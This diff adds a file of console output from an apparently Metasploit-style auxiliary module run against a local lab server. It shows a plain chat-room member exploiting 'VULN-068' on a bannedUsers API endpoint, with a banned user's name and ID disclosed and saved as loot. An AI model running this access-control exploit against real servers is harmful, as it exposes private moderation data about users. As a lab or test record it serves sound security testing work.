@@ -1,0 +1,18 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/rooms.bannedUsers
+SSL => false
+VERBOSE => true
+USERNAME => alice
+PASSWORD => Al1ce-Lab-Pass!
+ROOMID => 6b05d014e7422a44df31e14e
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as alice (user id rSQxouLt89hux5j4J)
+[+] 127.0.0.1:39649 - VULN-068: exploited
+[+] 127.0.0.1:39649 - 1 banned user(s) disclosed to a plain member of room 6b05d014e7422a44df31e14e
+[*]   carol (eGTjMdNNx9FHy4gwL)
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124205310_default_127.0.0.1_blue_spider.vuln_519294.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
